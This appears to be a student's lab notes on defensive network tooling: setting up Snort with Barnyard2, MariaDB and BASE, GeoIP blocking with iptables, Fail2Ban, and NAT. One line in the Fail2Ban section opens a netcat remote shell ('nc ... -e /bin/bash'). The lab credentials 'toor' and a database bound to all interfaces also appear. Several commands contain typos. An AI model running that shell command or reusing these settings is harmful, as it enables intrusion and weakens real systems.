+Except local rule all rule are comment it or delete it.
+Delete sites specific rules  and keep only 3 entries
+include $RULE_PATH/local.rules
+include $RULE_PATH/white_list.rules
+include $RULE_PATH/black_list.rules
+To test the configuration of snort.conf file.
+sudo snort -T -c /etc/snort/snort.conf    (t is for test and c is for configuration)
+Write the rules.
+sudo vim  /etc/snort/rules/local.rules
+alert ip any any → any any (msg: “Test”; sid: 1000001;)
+To Run the snort on console.
+sudo snort -i ens33 -u snort -g snort -c /etc/snort/snort.conf -A console
+
+
+
+##Snort with barynyard
+barnyard convert binary to ASCII
+Install dependencies(11): 
+sudo apt-get install -y autoconf automake default-libmysqlclient-dev dos2unix libmariadb-dev-compat libmariadb-dev libmariadbd-dev libtool mariadb-client mariadb-server unzip
+Downgrade the libpcap file
+sudo dpkg -s libpcap0.8 | grep Version
+Uninstall the libpcap0.8 and libpcap0.8-dev
+sudo apt-get purge libpcap0.8 libpcap0.8-dev
+Download the .deb packages for
+sudo wget libpcap0.8-dev_amd64.deb
+sudo wget libpcap0.8_amd64.deb
+change the directory to /tmp
+cd /tmp 
+download the libpcap and libpcap developer version
+install the libpcap packets.
+sudo dpkg -i <two libpcap files names>
+check the libpcap file version
+sudo dpkg -s libpcap0.8-dev | grep Version
+Open the snort configuration file:
+sudo nano /etc/snort/snort.conf
+Under the step 6 write the lines and uncomment it: 
+output unified2: filename snort.u2, limit 128
+To download barnyard and install 
+cd /tmp 
+Download the barnyard zip file **unzip** it (source code to temp directory)
+extract the file
+folder  will display 
+change the directory
+barnyanrd2-master.zip
+cd barnyard2-master
+run the autogen.sh configuration file.
+./autogen.sh   (it makes the configure filed)
+To creat the softlink
+ls -x
+sudo ln -s /usr/include/dumbnet.h  /usr/include/dnet.h (dnet is header file in barnyard but in debian it is dumbnet.h)
+To load file in the memory 
+sudo ldconfig
+To Install and execute the database libraries.
+sudo ./configure --with-mysql --with-mysql-libraries=/usr/lib/x86_64-linux-gnu/
+sudo make  
+sudo make install
+Here barnyard installation complete.
+check barnyard was installed or not.
+which barnyard2
+Don't change the directory be in /tmp/barnyard2-master.
+pwd
+sudo cp etc/barnyard2.conf  /etc/snort/
+sudo mkdir  /var/log/barnyard2
+sudo chown snort:snort  /var/log/barnyard2/
+sudo touch  /var/log/snort/barnyard2.waldo
+sudo chown snort:snort  /var/log/snort/barnyard2.waldo
+waldo file is bookmark file which keep tracking the snort log file.
+login to the root.
+sudo mysql -u root -p
+enter password 
+(in some cases  you have to enter the sudo ( shuhari ) password also )
+create a database
+none) > CREATE DATABASE IF NOT EXISTS snort;
+USE snort;
+snort prompt will open.
+MariaDB [snort] > SHOW TABLES;
+MariaDB [snort] > source /tmp/barnyard2-master/schemas/create_mysql;  (output should be OK)
+Create a database user name snort a
+MariaDB [snort] > CREATE USER ‘snort’@’localhost’ IDENTIFIED BY ‘toor’;
+give the permission to the user.
+MariaDB [snort] > GRANT CREATE,INSERT,SELECT,DELETE,UPDATE ON snort.* to ‘snort’@’localhost’;
+Do exit from mariaDB.
+MariaDB [snort] > exit
+Now the commands on debian machine
+sudo nano  /etc/snort/barnyard2.conf
+Add the following line at the end
+output database: log, mysql, user=snort password=toor dbname=snort host = localhost
+change the permission of barnyard2.conf file.
+sudo chmod o-r /etc/snort/barnyard2.conf
+Now write the rules in local.rules file of snort
+sudo nano /etc/snort/rules/local.rules
+In that file type the following:
+Alert ip any any -> any any (msg: "IP Packet"; sid:1000001; rev:1;)
+Alert ip 192.168.80.1 any -> any any (msg: “form base”; sid: 1000001; rev:1;)
+Alert ip 192.168.80.11 any -> any any (msg: “form 11”; sid: 1000002; rev:1;)
+Alert ip 192.168.80.12 any -> any any (msg: “form 12”; sid: 1000003; rev:1;)
+Alert ip 192.168.80.13 any -> any any (msg: “form 13”; sid: 1000004; rev:1;)
+To create the map file.
+Download perl script i,e create-sidmap.pl from local server.
+Go to the /tmp directory
+cd /tmp
+To download the sidmap.pl file and give permission
+sudo wget create-sidmap.pl
+chmod 755 create-sidmap.pl
+To execute this file either you open new terminal or login from root user.
+./create-sidmap.pl /etc/snort/rules/
+./create-sidmap.pl /etc/snort/rules/ > /etc/snort/sid-msg.map
+(it map the id and message )
+copy the sid-msg.map file to in the snort.
+sudo -i
+sudo cp sid-msg.map /etc/snort/sid-msg.map
+exit
+To check the snort logs open the another terminal 
+ls -l  /var/log/snort/
+sudo snort -q -i ens33 -u snort -g snort -c /etc/snort/snort.conf 
+where -q stands for quit mode
+sudo nano/etc/snort/snort.conf
+Open the another screen check the file and close the window 
+ls -l /var/log/snort
+open the new duplicate session of putty 
+sudo mysql -u root -p 
+MariaDB [snort] > USE Snort
+MariaDB [snort] > SHOW TABLES;
+MariaDB [snort] > SELECT COUNT(*) FROM iphdr; 
+open the new duplicate session of putty 
+start barynyard
+sudo banyard2 -c /etc/snort/barnyard2.conf -d /var/log/snort/ -f snort.u2 -w /var/log/snort/barnyard2.waldo -g snort -u snort 
+Run this command in another terminal to check barnyard is working or not 
+where -d - directory, f - filename 
+waldo file is track the record the barnyard record the u2 file or it is like a bookmark or tracker.
+give password: <here press enter button>
+Now the logs are seen.
+
+
+
+##Snort with Base(Basic Analysis and Security Engine(BASE))
+debian 8 required on which ( apache mariadb client) will run
+debian 12 on which(barnyard snort mariadb)
+apache installation required.
+In Debian 12 
+sudo nano /etc/mysql/mariadb.conf.d/50-server.cnf on deb 12 version  
+inside this file make changes 
+Under bind address change loopback series to 0.0.0.0.
+bind-address 			= 0.0.0.0
+sudo systemctl restart mariadb
+ss -ant
+Create another user to access the outside machine
+sudo mysql -u root -p
+MariaDB [(none)] > GRANT CREATE,INSERT,SELECT,DELETE,UPDATE ON snort.* to ‘snort’@'192.168.80.144’ IDENTIFIED BY ‘toor’;         
+(144 is the ip of debian8 machine)
+exit
+In debian 8 machine
+make change in /etc/apt/sources.list file.
+deb http://archive.debian.org/debian/ jessie main
+sudo apt-get update
+Install apache php base on debian 8
+apt-get install apache2 php5 libapache2-mod-php5 php5-mcrypt php5-mysqlnd libphp-adodb unzip
+Note down the path after installation
+To download Base on debian 8
+cd /tmp
+wget base tar  file
+ls -l 
+tar -zxf base-1.4.5.tar.gz
+move base-1.4.5(php file) to apache root.
+ls -x
+mv base-1.4.5 /var/www/html/base/
+chown -R www-data:www-data /var/www/html/base/
+nano /etc/php5/apache2/php.ini
+seacrch error_reporting (second occurance)
+On line 449 change the line to
+error_reporting = E_ALL & ~E_NOTICE(show all errors,except for notice)
+sudo systemctl restart apache2
+put debian 8 ip on web browser 
+press continue
+give path /usr/share/php/adodb
+press continue
+fill the crediantial database ost 192.168.80.128
+pickup database type: MySQL
+database username : snort
+databse password: 
+press continue
+give authentication system just no.( uncheck )
+admin
+click base tab at right side.
+
+
+
+##IPtables GEOIP
+GEOIP Database
+* download database
+    * download actual databse but not synchronise iptable. (download)
+    * script which change database which iptable recognize. (convert)
+
+xtable-addons 
+download in /tmp
+extract the file 
+change the directory
+to install the dependensies
+sudo apt-get install -y automake ca-certificatees gcc libc6-dev libnet-cidr-lite-perl libtext-csv-xs-perl libxtables-dev linux-headers-$(uname -r) make pkg-config unzip wget xz-utils
+Deb
+Uname -r ( command to find out the kernel)
+Uname -a (give all the info about the kernel)
+sudo apt-get dist-upgrade
+sudo apt-get install  automake ca-certificates gcc iptables -dev libc6-dev libnet-cidr-lite-perl libtext-csv-xs-perl linux-headers-$ (uname -r) make pkg-config unzip wget xz-utils
+configure
+./configure
+sudo make 
+sudo make install 
+/usr/local/libexec/xtables-addons/
+here download and build file are important.check it in the above directory.
+crate folder inside /home 
+cd /home
+mkdir xtables
+cd xtables
+run the downloaded script 
+/usr/local/libexec/xtables-addons/xt_geoip_dl
+ls -l
+sudo mkdir /usr/share/xt_geoip
+use second script to convert 
+sudo /usr/local/libexec/xtables-addons/xt_geoip_build -D /usr/share/xt_geoip/ *.csv
+sudo iptables -m geoip -h (it will give error)
+sudo depmod -a 
+(it will add all dependencies to the memory or it loads the files or dependencies in the main memory)
+sudo iptables -I INPUT -m geoip --src-cc CN -j DROP
+(whre -I for insert -m for module -j for jump)
+sudo iptables -A INPUT -m geoip --src-cc CN -j LOG --log-level-debug --log-prefix *| Trafficform you firend |*
+sudo iptables -L -v
+sudo iptables  -L
+sudo tail -f /var/log/syslog
+sudo jaournalctl -f
+
+
+
+## Fail2Ban
+sudo apt-get install iptables
+sudo apt-get install fail2ban
+sudo fail2ban-client status
+sudo nano /etc/fail2ban/jail.conf (before changeing the file take backup of the files)
+under sshd uncomment the line 
+enabled = true
+port = ssh
+filter = ssh
+logpath = /var/log/auth.log
+backend = systemd
+sudo apt-get update install python3-systemd
+restart the service 
+sudo sysemctl restart fail2ban
+sudo systemctl status fail2ban
+check the number of jails 
+sudo fail2ban-client status
+to check how long you ban 
+sudo fail2ban-client get sshd bantime
+sudo iptables -L 
+shift to debian anotehr 
+tryp to ssh with wrong password
+ssh shuhari@192.168.80.128
+password : keep try worng password
+go to another machine in which fail2ban installaed 
+sudo iptables -L 
+new chin will form on iptables.
+to check the IPv6 iptables
+sudo ip6tables -L
+Reverse Bind Shell
+on window
+nc -lvvp 4444
+on kali
+nc -v 192.168.80.129 4444 -e /bin/bash
+
+##NDC Lab: port forwarding in iptables  
+insall apache  on 80.128
+sudo aptget install iptables
+sudo iptables -L 
+sud iptables -t nat
+sudo iptatbles -t nat -A PREROUTING -p tcp --dport 8001 -j REDIRECT --to-port 80
+
+## NDC Lab: PreRouting (enable port forwarding on a debian machine from port 8001 to 80 or vice versa)
+sudo iptables -t nat -L
+sudo apt-get install apache2
+ip a or hostname  -I
+sudo iptables -t nat -A PREROUTING -p tcp --dport 8001 -j REDIRECT --to-port 80
+
+## LAB: Use ip table to share Internet/ connecting two network using SNAT: 
+# Exam Question: Connect two diffrent custom network using SNAT
+
+deb 1 machine having ip 192.168.40.10 
+deb 2 machine having ip 192.168.40.101 192.168.50.101
+deb 3 machine having ip 192.168.50.10
+
+deb 2
+sudo nano /proc/sys/ne/ipv4/ip_forward
+in that type 1
+ping will start.
+
+run tcpdump in deb3 
+sudo tcpdump -i ens33 icmp
+
+sudo iptable -t nat -A POSTROUTING -o ens33 -j MASQUERADE
+
